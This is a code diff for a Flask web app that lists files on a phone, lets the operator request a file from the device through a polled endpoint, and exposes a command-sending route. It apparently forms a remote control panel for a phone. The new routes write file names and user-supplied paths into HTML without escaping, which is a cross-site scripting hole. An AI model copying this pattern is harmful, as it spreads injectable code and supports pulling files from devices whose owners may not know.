@@ -184,35 +184,46 @@ def mobile_files_list():
 def mobile_files_view():
 
     html = """
-    <html>
-    <head>
-        <title>Mobile Files</title>
-    </head>
-    <body>
-        <h2>Files on Phone</h2>
-        <table border="1" cellpadding="10">
-            <tr>
-                <th>Name</th>
-                <th>Size (Bytes)</th>
-                <th>Path</th>
-            </tr>
-    """
+<html>
+<body>
+<table border="1">
+<tr>
+<th>Name</th>
+<th>Size</th>
+<th>Download</th>
+</tr>
+"""
 
     for f in mobile_files:
         html += f"""
         <tr>
             <td>{f['name']}</td>
             <td>{f['size']}</td>
-            <td>{f['path']}</td>
-        </tr>
-        """
+
+        <td>
+            <form action="/request_mobile_file" method="post">
+
+                <input
+                    type="hidden"
+                    name="path"
+                    value="{f['path']}"
+                >
+
+                <button type="submit">
+                    Download
+                </button>
+
+            </form>
+        </td>
+
+    </tr>
+    """
 
     html += """
         </table>
     </body>
     </html>
     """
-
     return html
 @app.route("/request_file", methods=["POST"])
 def request_file():
@@ -225,16 +236,38 @@ def request_file():
     return jsonify({
         "status": "success"
     })
-
-
 @app.route("/get_requested_file")
 def get_requested_file():
 
     global requested_file
 
+    path = requested_file
+
+    requested_file = ""
+
     return jsonify({
-        "path": requested_file
+        "path": path
     })
+
+
+requested_file = ""
+
+@app.route("/request_mobile_file", methods=["POST"])
+def request_mobile_file():
+
+    global requested_file
+
+    requested_file = request.form.get("path")
+
+    return f"""
+    <h2>File Requested</h2>
+
+    <p>{requested_file}</p>
+
+    <a href="/mobile_files_view">
+        Back
+    </a>
+    """
 
 @app.route("/send_command", methods=["POST"])
 def send_command():
